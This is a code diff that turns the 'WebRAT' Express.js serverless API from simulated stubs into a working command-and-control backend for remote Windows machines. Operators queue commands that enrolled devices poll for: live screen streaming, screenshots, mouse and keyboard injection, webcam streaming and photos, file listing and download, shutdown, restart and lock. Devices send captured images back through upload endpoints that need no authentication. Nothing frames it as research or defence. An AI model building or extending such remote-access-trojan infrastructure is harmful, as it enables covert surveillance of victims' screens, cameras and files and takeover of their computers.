@@ -1,6 +1,5 @@
 const express = require('express');
 const cors = require('cors');
-const path = require('path');
 
 const app = express();
 
@@ -15,18 +14,23 @@ app.use(cors({
   origin: [
     'https://webrat.vercel.app', 
     'http://localhost:5000',
-    /^https:\/\/.*\.vercel\.app$/, // Allow all Vercel preview deployments
-    /^http:\/\/localhost:\d+$/ // Allow any localhost port
+    /^https:\/\/.*\.vercel\.app$/,
+    /^http:\/\/localhost:\d+$/
   ],
-  credentials: true
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token']
 }));
 
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// In-memory storage for demo (will reset on each deployment)
+// In-memory storage
 let authenticatedSessions = new Set();
-let connectedDevices = [];
+let connectedDevices = new Map();
+let commandQueue = new Map(); // Store commands for devices
+let deviceScreenshots = new Map(); // Store latest screenshots
+let deviceCameraFeeds = new Map(); // Store camera feeds
 
 // Authentication middleware
 const requireAuth = (req, res, next) => {
@@ -42,7 +46,7 @@ const requireAuth = (req, res, next) => {
   }
 };
 
-// Routes
+// Auth Routes
 app.get('/api/auth/status', (req, res) => {
   const isAuth = authenticatedSessions.has(req.ip);
   res.json({ 
@@ -71,140 +75,454 @@ app.post('/api/logout', (req, res) => {
   res.json({ success: true, message: 'Logged out successfully' });
 });
 
-// Device management endpoints
+// Device Management Routes
 app.get('/api/devices', requireAuth, (req, res) => {
-  res.json(connectedDevices);
+  const devices = Array.from(connectedDevices.values()).map(device => ({
+    ...device,
+    hasScreenshot: deviceScreenshots.has(device.id),
+    hasCameraFeed: deviceCameraFeeds.has(device.id),
+    lastSeen: Date.now() - device.lastHeartbeat < 30000 ? 'online' : 'offline'
+  }));
+  res.json(devices);
 });
 
 app.post('/api/devices/register', (req, res) => {
-  const { deviceId, name, clientType, deviceInfo } = req.body;
+  const { deviceId, name, osInfo, capabilities } = req.body;
   
   const deviceData = {
     id: deviceId,
-    name: name || `Device ${deviceId}`,
-    type: clientType || 'unknown',
+    name: name || `Windows-${deviceId.slice(-4)}`,
+    type: 'windows',
     ip: req.ip,
-    osInfo: deviceInfo || {},
-    deviceType: clientType === 'mobile' ? 'mobile' : 'desktop',
+    osInfo: osInfo || {},
+    capabilities: capabilities || [],
     status: 'online',
-    lastSeen: Date.now()
+    lastHeartbeat: Date.now(),
+    connectedAt: Date.now()
   };
   
-  // Remove existing device with same ID
-  connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
-  connectedDevices.push(deviceData);
+  connectedDevices.set(deviceId, deviceData);
   
-  res.json({ success: true, message: 'Device registered' });
+  if (!commandQueue.has(deviceId)) {
+    commandQueue.set(deviceId, []);
+  }
+  
+  res.json({ success: true, message: 'Device registered successfully' });
+});
+
+app.post('/api/devices/:deviceId/heartbeat', (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (device) {
+    device.lastHeartbeat = Date.now();
+    device.status = 'online';
+    connectedDevices.set(deviceId, device);
+  }
+  
+  res.json({ success: true });
+});
+
+// Command Management
+app.get('/api/devices/:deviceId/commands', (req, res) => {
+  const { deviceId } = req.params;
+  const commands = commandQueue.get(deviceId) || [];
+  
+  // Clear commands after sending
+  commandQueue.set(deviceId, []);
+  
+  res.json({ commands });
 });
 
 app.post('/api/devices/:deviceId/command', requireAuth, (req, res) => {
   const { deviceId } = req.params;
-  const { command, type } = req.body;
+  const { command, type, data } = req.body;
   
-  const device = connectedDevices.find(d => d.id === deviceId);
+  const device = connectedDevices.get(deviceId);
   if (!device) {
     return res.status(404).json({ error: 'Device not found' });
   }
   
-  // In a real implementation, this would send the command via WebSocket
-  // For now, we'll just simulate success
-  res.json({ success: true, message: 'Command sent (simulated)' });
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type,
+    command,
+    data,
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: `${type} command queued` });
 });
 
+// Screen Control
 app.post('/api/devices/:deviceId/screenshot', requireAuth, (req, res) => {
   const { deviceId } = req.params;
-  const device = connectedDevices.find(d => d.id === deviceId);
+  const device = connectedDevices.get(deviceId);
   
   if (!device) {
     return res.status(404).json({ error: 'Device not found' });
   }
   
-  res.json({ success: true, message: 'Screenshot request sent (simulated)' });
-});
-
-app.post('/api/devices/:deviceId/camera', requireAuth, (req, res) => {
-  const { deviceId } = req.params;
-  const device = connectedDevices.find(d => d.id === deviceId);
-  
-  if (!device) {
-    return res.status(404).json({ error: 'Device not found' });
-  }
-  
-  res.json({ success: true, message: 'Camera request sent (simulated)' });
-});
-
-app.post('/api/devices/:deviceId/location', requireAuth, (req, res) => {
-  const { deviceId } = req.params;
-  const device = connectedDevices.find(d => d.id === deviceId);
-  
-  if (!device) {
-    return res.status(404).json({ error: 'Device not found' });
-  }
-  
-  res.json({ success: true, message: 'Location request sent (simulated)' });
-});
-
-app.post('/api/devices/:deviceId/sms', requireAuth, (req, res) => {
-  const { deviceId } = req.params;
-  const { number, text } = req.body;
-  const device = connectedDevices.find(d => d.id === deviceId);
-  
-  if (!device) {
-    return res.status(404).json({ error: 'Device not found' });
-  }
-  
-  if (device.deviceType !== 'mobile') {
-    return res.status(400).json({ error: 'SMS only available for mobile devices' });
-  }
-  
-  res.json({ success: true, message: 'SMS request sent (simulated)' });
-});
-
-app.post('/api/devices/:deviceId/lock', requireAuth, (req, res) => {
-  const { deviceId } = req.params;
-  const device = connectedDevices.find(d => d.id === deviceId);
-  
-  if (!device) {
-    return res.status(404).json({ error: 'Device not found' });
-  }
-  
-  res.json({ success: true, message: 'Lock request sent (simulated)' });
-});
-
-// WebSocket endpoint (simplified for Vercel)
-app.get('/ws', (req, res) => {
-  res.json({ 
-    message: 'WebSocket endpoint - use polling for device updates in serverless environment',
-    devices: connectedDevices.length 
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'screenshot',
+    command: 'take_screenshot',
+    timestamp: Date.now()
   });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Screenshot requested' });
 });
 
-// Health check endpoint
+app.post('/api/devices/:deviceId/screen/start', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'screen_stream',
+    command: 'start_screen_stream',
+    data: { interval: 500 }, // 2 FPS
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Live screen view started' });
+});
+
+app.post('/api/devices/:deviceId/screen/stop', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'screen_stream',
+    command: 'stop_screen_stream',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Live screen view stopped' });
+});
+
+app.post('/api/devices/:deviceId/screen/click', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { x, y, button } = req.body;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'mouse_click',
+    command: 'mouse_click',
+    data: { x, y, button: button || 'left' },
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Mouse click sent' });
+});
+
+app.post('/api/devices/:deviceId/keyboard', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { text, key } = req.body;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'keyboard',
+    command: text ? 'type_text' : 'press_key',
+    data: { text, key },
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Keyboard input sent' });
+});
+
+// Camera Control
+app.post('/api/devices/:deviceId/camera/start', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'camera',
+    command: 'start_camera_stream',
+    data: { quality: 'medium' },
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Camera stream started' });
+});
+
+app.post('/api/devices/:deviceId/camera/stop', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'camera',
+    command: 'stop_camera_stream',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Camera stream stopped' });
+});
+
+app.post('/api/devices/:deviceId/camera/photo', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'camera',
+    command: 'take_photo',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Photo capture requested' });
+});
+
+// File Management
+app.post('/api/devices/:deviceId/files/list', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { path } = req.body;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'file_management',
+    command: 'list_files',
+    data: { path: path || 'C:\\' },
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'File list requested' });
+});
+
+app.post('/api/devices/:deviceId/files/download', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { filepath } = req.body;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'file_management',
+    command: 'download_file',
+    data: { filepath },
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'File download requested' });
+});
+
+// System Control
+app.post('/api/devices/:deviceId/system/shutdown', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'system',
+    command: 'shutdown',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Shutdown command sent' });
+});
+
+app.post('/api/devices/:deviceId/system/restart', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'system',
+    command: 'restart',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Restart command sent' });
+});
+
+app.post('/api/devices/:deviceId/system/lock', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const commands = commandQueue.get(deviceId) || [];
+  commands.push({
+    id: Date.now().toString(),
+    type: 'system',
+    command: 'lock_screen',
+    timestamp: Date.now()
+  });
+  commandQueue.set(deviceId, commands);
+  
+  res.json({ success: true, message: 'Screen lock command sent' });
+});
+
+// Data Upload Endpoints (for client to send data back)
+app.post('/api/devices/:deviceId/upload/screenshot', (req, res) => {
+  const { deviceId } = req.params;
+  const { imageData, timestamp } = req.body;
+  
+  deviceScreenshots.set(deviceId, {
+    data: imageData,
+    timestamp: timestamp || Date.now()
+  });
+  
+  res.json({ success: true, message: 'Screenshot received' });
+});
+
+app.post('/api/devices/:deviceId/upload/camera', (req, res) => {
+  const { deviceId } = req.params;
+  const { imageData, timestamp } = req.body;
+  
+  deviceCameraFeeds.set(deviceId, {
+    data: imageData,
+    timestamp: timestamp || Date.now()
+  });
+  
+  res.json({ success: true, message: 'Camera frame received' });
+});
+
+// Data Retrieval Endpoints
+app.get('/api/devices/:deviceId/screenshot/latest', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const screenshot = deviceScreenshots.get(deviceId);
+  
+  if (!screenshot) {
+    return res.status(404).json({ error: 'No screenshot available' });
+  }
+  
+  res.json(screenshot);
+});
+
+app.get('/api/devices/:deviceId/camera/latest', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const cameraFrame = deviceCameraFeeds.get(deviceId);
+  
+  if (!cameraFrame) {
+    return res.status(404).json({ error: 'No camera feed available' });
+  }
+  
+  res.json(cameraFrame);
+});
+
+// Health and status endpoints
 app.get('/api/health', (req, res) => {
   res.json({ 
     status: 'healthy',
     timestamp: new Date().toISOString(),
-    devices: connectedDevices.length,
+    devices: connectedDevices.size,
     environment: 'serverless'
   });
 });
 
-// Default route
+app.get('/ws', (req, res) => {
+  res.json({ 
+    message: 'WebSocket endpoint - using HTTP polling for serverless',
+    devices: connectedDevices.size 
+  });
+});
+
 app.get('/', (req, res) => {
   res.json({ 
-    message: 'WebRAT API Server',
-    version: '2.0.0',
-    environment: 'serverless'
+    message: 'WebRAT Windows Remote Administration API',
+    version: '3.0.0',
+    environment: 'serverless',
+    features: ['live_screen', 'camera_control', 'file_management', 'system_control']
   });
 });
 
-// Error handling middleware
+// Error handling
 app.use((error, req, res, next) => {
   console.error('Server error:', error);
   res.status(500).json({ error: 'Internal server error' });
 });
 
-// For Vercel serverless function, export the handler
+// Cleanup old devices (remove devices that haven't sent heartbeat in 2 minutes)
+setInterval(() => {
+  const now = Date.now();
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (now - device.lastHeartbeat > 120000) { // 2 minutes
+      connectedDevices.delete(deviceId);
+      commandQueue.delete(deviceId);
+      deviceScreenshots.delete(deviceId);
+      deviceCameraFeeds.delete(deviceId);
+    }
+  }
+}, 60000); // Check every minute
+
 module.exports = (req, res) => {
   app(req, res);
 };
